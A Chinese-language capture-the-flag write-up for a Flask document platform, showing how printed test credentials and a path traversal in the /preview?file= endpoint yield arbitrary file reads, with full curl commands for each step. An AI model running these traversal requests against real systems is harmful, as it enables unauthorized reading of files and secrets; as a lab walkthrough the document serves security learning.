## 题目原文

> 公司新上线的文档协作平台支持在线预览和格式转换功能，最近 IT 部门发现系统有异常行为，日志中出现可疑的 API 调用记录。请求安全团队协助排查系统是否存在安全隐患。

## 题解

### 入口与指纹

`Werkzeug/3.1.7` + `Python/3.9.25` 的 Flask 应用。登录页直接把测试账号写在页面上：

```
普通用户：viewer / view123!
管理员：sysadmin / docpass
```

登录后 `dashboard.php` 对应的路由是 `/dashboard`：上传文档（TXT/PDF/DOC/DOCX/MD，10MB），列表里每条有「预览」。

管理员额外有一个 `/admin`，里面是「文档转换工具」：

```js
fetch('/api/admin/convert', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: `input_file=${...}&output_format=${...}`
})
```

页面提示「管理接口已通过 API_KEY 保护」。

### 关键观察

**1. 转换接口需要 API_KEY，但页面上没有。**

```
POST /api/admin/convert
input_file=/challenge/flag.txt&output_format=txt
→ {"error":"Invalid API Key"}
```

不带头、带错头、查询参数、JSON body 全都返回 `Invalid API Key`；而且**没有登录也会先报 API Key 错误**，说明鉴权顺序是「先 Key 后会话」。Key 不在页面里，`/logs`、`/api/admin/config`、`/static/app.py` 全 404。

**2. 预览接口按文件名读磁盘，且没有目录限制。**

上传一个文件后，列表里的链接是：

```html
<a href="/preview?file=7c32547cc161c8eb_d.txt">预览</a>
```

`file` 是服务端生成的前缀 + 原始文件名。把 `file` 换成绝对路径或穿越路径：

```bash
curl -s -b cj -G --data-urlencode 'file=/challenge/flag.txt' \
  'http://T/preview'
# flag{36a98a0d-320a-417a-9f1b-dd7b739ca7b0}
```

直接返回文件内容。`../` 形式和绝对路径都可以；URL 编码过的 `..%2f` 和 `....//` 反而 404（说明过滤器只做了 URL 解码后的字符串比较，而 `../` 恰好被放过了——顺序问题不重要，能读就行）。

**3. 「转换工具」是干扰项。**

`/api/admin/convert` 需要 API Key，而 Key 不在可达范围里；`preview` 已经在同一台机器上提供了文件读，没必要再攻转换接口。

### 利用链

**Step 1：用页面给的账号登录。**

```bash
T=10.0.0.0   # 本例地址已失效
curl -s -c cj -X POST -d 'username=sysadmin&password=docpass' "http://$T/login"
# 302 → /dashboard
```

**Step 2：随便传一个文件，拿到预览链接的形状。**

```bash
printf 'hello' > d.txt
curl -s -b cj -F 'file=@d.txt;filename=d.txt' "http://$T/upload"
curl -s -b cj "http://$T/dashboard" | grep -o 'href="/preview[^"]*"'
# href="/preview?file=7c32547cc161c8eb_d.txt"
```

**Step 3：把 `file` 换成 flag 路径。**

```bash
curl -s -b cj -G --data-urlencode 'file=/challenge/flag.txt' "http://$T/preview"
# flag{36a98a0d-320a-417a-9f1b-dd7b739ca7b0}
```

### flag 位置

| flag | 位置 |
| --- | --- |
| 1 | `/challenge/flag.txt`，通过 `/preview?file=` 路径穿越读取 |

### 复盘

- **登录页写着测试账号时先用它。** 本题的账号直接印在页面上，省掉一整个爆破阶段。
- **「需要 API Key」不一定是主路。** 看到 `Invalid API Key` 且 Key 不在页面里，先检查同一台机器上有没有别的文件读入口；`preview`/`download`/`export` 这类接口经常比「受保护的转换接口」松得多。
- **`?file=` 参数要按「拼接点」测试。** 这里既有绝对路径也有 `../` 通过，说明只做了很弱的字符串过滤；`%2f` 被拒反而是次要信号，说明后端对解码后的字符串做了比较，但漏了 `../`。
- **上传 + 预览是常见的组合拳。** 上传提供一个合法文件名，预览提供读文件的入口；两者合起来就能读任意路径。
- **题目里提到的「可疑 API 调用日志」是叙事线索，不一定是入口。** 本题的日志只在描述里出现，实际入口在预览。
